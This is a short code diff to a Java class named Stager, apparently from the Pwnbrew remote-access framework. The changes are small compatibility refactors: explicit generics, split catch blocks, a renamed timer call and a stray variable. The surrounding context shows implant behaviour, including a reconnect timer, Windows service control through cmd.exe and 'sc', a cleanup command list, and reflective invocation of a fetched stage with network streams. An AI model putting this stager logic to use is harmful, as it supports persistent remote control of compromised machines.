@@ -122,7 +122,7 @@ public class Stager extends ClassLoader {
                         Long aLong = Long.parseLong(sleepTime );
                         Date tmpDate = new Date( aLong ); 
 
-                        aTimer.addReconnectTime(tmpDate);
+                        aTimer.setIntialSleepDate(tmpDate);
                     }
 
                     //Get sleep time if it exists
@@ -178,11 +178,11 @@ public class Stager extends ClassLoader {
         URL classUrl = Stager.class.getProtectionDomain().getCodeSource().getLocation();
         File theJarFile = new File( classUrl.toURI() ); 
         
-        List<String> cleanupList = new ArrayList<>();
+        List<String> cleanupList = new ArrayList<String>();
         if( !serviceName.isEmpty() && System.getProperty( "os.name" ).toLowerCase().contains("windows")){
                     
             //Tell the service to stop and restart
-            final List<String> strList = new ArrayList<>();
+            final List<String> strList = new ArrayList<String>();
             strList.add("cmd.exe");
             strList.add("/c");
             strList.add("sc qc \"" + serviceName + "\"");
@@ -246,7 +246,10 @@ public class Stager extends ClassLoader {
             try{
                 Process aProcess = Runtime.getRuntime().exec(cleanupList.toArray( new String[cleanupList.size()]) );
                 aProcess.waitFor();
-            } catch(IOException | InterruptedException ex){
+            } catch(IOException ex ){
+                ex = null;
+            } catch( InterruptedException ex ){
+                ex = null;
             }
 
         } else {
@@ -335,6 +338,7 @@ public class Stager extends ClassLoader {
 
                         Method aMethod = localClass.getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, String[].class });
                         aMethod.invoke(pwnbrewStage, new Object[] { localDataInputStream, paramOutputStream, theObjArr });
+                        int i =0;
                     }   
             }
         
